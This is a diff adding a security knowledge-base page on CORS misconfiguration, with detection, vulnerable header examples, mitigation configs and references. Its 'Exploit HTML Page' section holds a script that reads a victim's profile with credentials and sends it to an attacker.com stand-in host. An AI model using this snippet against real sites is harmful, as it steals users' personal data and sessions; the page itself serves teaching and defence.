@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Misconfiguration | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+    .logo span { color: var(--primary); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+    .page-header { padding: 6rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .severity-badge { display: inline-block; background: rgba(255, 193, 7, 0.2); color: #ffc107; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
+    .vulnerability-box { background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    .reference-link { color: var(--primary); text-decoration: none; }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Resume</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / CORS Misconfiguration</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Medium Severity | OWASP A01:2021</span>
+      <h1>📌 CORS Misconfiguration</h1>
+    </div>
+
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is CORS?</strong></p>
+      <p>Cross-Origin Resource Sharing (CORS) is a mechanism that allows restricted resources on a web page to be requested from another domain. A misconfigured CORS policy can allow malicious websites to access sensitive data from your application.</p>
+      <p><strong>Why does it occur?</strong></p>
+      <p>Developers configure CORS headers too permissively (e.g., <code>Access-Control-Allow-Origin: *</code> or dynamically reflecting the <code>Origin</code> header without validation).</p>
+    </div>
+
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Security Misconfiguration</li>
+        <li><strong>OWASP:</strong> A01:2021 – Broken Access Control</li>
+        <li><strong>CWE:</strong> CWE-942: Permissive Cross-domain Policy with Untrusted Domains</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ API endpoints returning sensitive data</li>
+        <li>✅ Endpoints with <code>Access-Control-Allow-Origin: *</code></li>
+        <li>✅ Endpoints that reflect Origin header without validation</li>
+        <li>✅ Endpoints with <code>Access-Control-Allow-Credentials: true</code></li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check CORS headers using curl
+curl -H "Origin: https://attacker.com" -I https://target.com/api/data
+
+# Look for these headers:
+# Access-Control-Allow-Origin: *
+# Access-Control-Allow-Origin: https://attacker.com
+# Access-Control-Allow-Credentials: true
+# Access-Control-Allow-Methods: GET, POST, PUT, DELETE</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>💣 Vulnerable Configurations</h2>
+      <div class="payload-category">⚠️ Dangerous CORS Configurations</div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Vulnerable - Wildcard with credentials
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+# Vulnerable - Reflecting arbitrary Origin
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+
+# Vulnerable - Null origin
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+# Vulnerable - Regex bypass using subdomains
+Access-Control-Allow-Origin: https://target.com.attacker.com</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Identify endpoint with CORS headers</li>
+        <li>Check if <code>Access-Control-Allow-Origin</code> reflects the Origin header</li>
+        <li>Check if credentials are allowed (<code>Access-Control-Allow-Credentials: true</code>)</li>
+        <li>Create malicious HTML page to steal data</li>
+        <li>Trick victim into visiting the page</li>
+      </ol>
+
+      <div class="payload-category">🎯 Exploit HTML Page</div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+  fetch('https://target.com/api/user/profile', {
+    credentials: 'include'
+  })
+  .then(response => response.json())
+  .then(data => {
+    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
+  });
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Avoid wildcard (*) with credentials:</strong> Never use <code>Access-Control-Allow-Origin: *</code> with credentials<br>
+        <strong>✅ Whitelist allowed origins:</strong> Maintain a strict list of trusted domains<br>
+        <strong>✅ Don't reflect Origin header:</strong> Never dynamically echo the Origin header without validation<br>
+        <strong>✅ Use Vary: Origin header:</strong> Prevent caching issues<br>
+        <strong>✅ Limit allowed methods:</strong> Only expose necessary HTTP methods<br>
+        <strong>✅ Prefer same-origin when possible:</strong> Keep APIs on the same domain
+      </div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Secure CORS Configuration (Apache)
+Header set Access-Control-Allow-Origin "https://trusted-domain.com"
+Header set Access-Control-Allow-Credentials "true"
+Header set Vary "Origin"
+
+# Secure CORS Configuration (Nginx)
+add_header 'Access-Control-Allow-Origin' 'https://trusted-domain.com' always;
+add_header 'Access-Control-Allow-Credentials' 'true' always;
+add_header 'Vary' 'Origin' always;</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Medium to High</strong><br><br>
+        <strong>Impact:</strong>
+        <ul>
+          <li>Data theft (PII, API keys, tokens)</li>
+          <li>Session hijacking</li>
+          <li>CSRF-style attacks across origins</li>
+          <li>Reading sensitive API responses</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/cors" class="reference-link" target="_blank">PortSwigger: CORS</a></li>
+        <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/07-Testing_Cross_Origin_Resource_Sharing" class="reference-link" target="_blank">OWASP: CORS Testing</a></li>
+        <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" class="reference-link" target="_blank">MDN: CORS</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | CORS Misconfiguration - Complete Guide</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
